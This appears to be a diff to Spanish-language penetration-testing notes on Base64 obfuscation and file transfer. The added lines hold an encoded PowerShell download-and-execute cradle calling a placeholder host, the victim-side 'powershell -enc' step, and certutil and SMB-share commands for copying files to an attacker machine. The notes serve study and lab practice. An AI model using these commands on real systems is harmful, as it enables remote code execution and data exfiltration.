@@ -18,13 +18,20 @@ La ofuscación es una técnica empleada por los atacantes para ocultar o camufla
 6. Incorporación de cargas útiles: Los atacantes a menudo necesitan incorporar cargas útiles dentro de otros scripts o documentos. La codificación Base64 permite que estas cargas útiles se representen como cadenas simples, lo que facilita su inclusión.
 ```
 
+## Kali y Powershell
+
 ```powershell
+# Codificas en Kali
 ❯ echo -n 'IEX (new-object net.webclient).downloadstring("http://IP/Invoke-Script.ps1")' | iconv -t UTF-16LE | base64 -w 0
 
 	# echo -n 'IEX ...' = Imprime la cadena (que es el código PowerShell) sin añadir un nuevo línea al final.
 	# | = Es un pipe, que toma la salida del comando anterior y la usa como entrada para el siguiente comando.
 	# iconv -t UTF-16LE = Usa 'iconv' para convertir la cadena a UTF-16LE. PowerShell utiliza por defecto la codificación UTF-16LE para sus scripts codificados en Base64.
 	# base64 -w 0 = Codifica la cadena convertida en Base64 sin dividirla en múltiples líneas ('-w 0' significa "no hacer wraps" o "no dividir en líneas").
+
+
+# Ejecutas en PS de la maquina victima 
+❯ powershell -enc "gy5wywg5e46gw46gw5sderyd"  # Decodificar y ejecutar el comando anterior en base64 para powershell 
 ```
 
 ## Transferencia de archivos con base64
@@ -42,15 +49,17 @@ La ofuscación es una técnica empleada por los atacantes para ocultar o camufla
 ## Powershell
 
 ```powershell
-❯ $bytes = [System.IO.File]::ReadAllBytes("20230903112419_script.zip")
-❯ $base64 = [System.Convert]::ToBase64String($bytes)
-❯ Set-Content -Value $base64 -Path psb64.txt
+❯ $bytes = [System.IO.File]::ReadAllBytes("20230903112419_script.zip")  # Agregar el archivo a una variable 
+❯ $base64 = [System.Convert]::ToBase64String($bytes)                    # Convertir la variable a base64
+❯ Set-Content -Value $base64 -Path psb64.txt                            # Obtener el archivo que contiene el valor de la variable codificada en base64
+
+❯ certutil -decode .\psb64.txt comply.zip                          # Decodificar el archivo en base64 para powershell 
 ```
 
 ## Certutil
 
 ```powershell
-❯ certutil -encode 20230903112419_spartan.zip certb64.txt
+❯ certutil -encode 20230903112419_script.zip certb64.txt           # Codificar el archivo en base64 y obtener uno en txt 
 
 # Trasladar el contenido para decodificar
 ❯ net use \\192.168.45.191\kali-share /u:kali kali
@@ -58,6 +67,6 @@ La ofuscación es una técnica empleada por los atacantes para ocultar o camufla
 ❯ copy psb64.txt \\192.168.45.191\kali-share\psb64.txt
 
 # Decodificar y obtener el archivo original
-❯ certutil -decode .\psb64.txt comply.zip
+❯ certutil -decode .\psb64.txt comply.zip                          # Decodificar el archivo en base64 para powershell 
 ```
 
